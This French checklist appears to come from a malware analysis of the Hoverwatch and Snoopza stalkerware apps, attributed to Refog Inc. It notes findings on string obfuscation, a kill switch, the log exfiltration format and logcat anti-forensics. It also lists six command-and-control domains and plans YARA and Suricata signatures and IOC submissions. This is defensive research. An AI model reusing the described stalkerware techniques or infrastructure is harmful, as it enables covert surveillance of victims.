- [x] **Attribution / éditeur** — Refog Inc., confirmé via binary diff avec Snoopza — v2
- [x] **Statut de `providers.json`** — asset orphelin confirmé — v2
- [x] **Déchiffrer les strings obfusquées** (`C0874h.m6237c()`) — 13 blobs décryptés, finding canary `"refog"` + YouTube Kids caché — v3 (cf. §5.5)
- [x] **Analyser le kill switch** (`C0744c`) — Intent.ACTION_DELETE standard, opportuniste via USER_PRESENT — v3 (cf. §20)
- [x] **Format des logs exfiltrés** — multipart Apache HttpClient, **PAS protobuf** comme cru en v1/v2 — v3 (cf. §6.5)
- [x] **Schéma BDD messages IM** (`C0752h`/`C0751h`) — table `mpk_events`, structure `i`, dédup temporelle, rétention 300/conv — v3 (cf. §9.5)
- [x] **Flow `ActivityInstaller`** — 11 fragments séquentiels, 18 modules togglables — v3 (cf. §22)
- [x] **Anti-forensics logcat** — crash scraping + clearing via DES strings dans `C0878l$a` — v3 (cf. §21)

### À faire

- [ ] **Mettre à jour le mock C2 server** (`mock_c2/`) avec les findings v3 :
  - format multipart au lieu de protobuf
  - parts nommées `log%04d` / `exception%04d`
  - support des deux brands (header `X-Auth-Key`, path `programversion/{HWA|SNPA}/`)
  - tests Suricata/Snort signatures
- [ ] **Passive DNS / certs TLS** sur les 6 domaines C2 (`a.syncvch.com`, `i1.hoverwatch.com`, `hwa.cab`, `snsync.com`, `app.snoopza.com`, `api.snoopza.com`) — corrélation infra Snoopza↔Hoverwatch via Validin/SecurityTrails/DomainTools
- [ ] **PR upstream AssoEchap/stalkerware-indicators** avec les 4 nouveaux IOCs (`a.syncvch.com`, `hwa.cab`, `snsync.com`, `app.snoopza.com`) + clarifier sous-domaines partiels (`i1.hoverwatch.com`, `api.snoopza.com`)
- [ ] **Rule YARA** basée sur le canary `"refog"` déchiffrable + ternaire `"SNPA":"HWA_TST":"HWA"` dans `C0737a` — signature Refog ecosystem
- [ ] **Diff resources** Hoverwatch/Snoopza (`res/values/strings.xml`, drawables `ic_launcher`, `ic_dbl_launcher`, `ic_sett_launcher`) pour confirmer le scope exact du branding et lister les strings de marque dans chaque APK
- [ ] **Reverser d'autres samples** Refog candidats : Highstermobi, Prospybubble, Refog Personal Monitor — confirmer/infirmer appartenance via :
  - Présence du canary `"refog"` déchiffrable
  - Pattern package `com.android.core.XXXXX`
  - Présence de `f5124e` ternaire avec leur brand code
- [ ] **Update Notion** — page "Écosystème stalkerware" avec finding Refog Inc. distinct de Brainstack/Struktura, ajouter les 6 domaines C2 et le pattern multi-brand
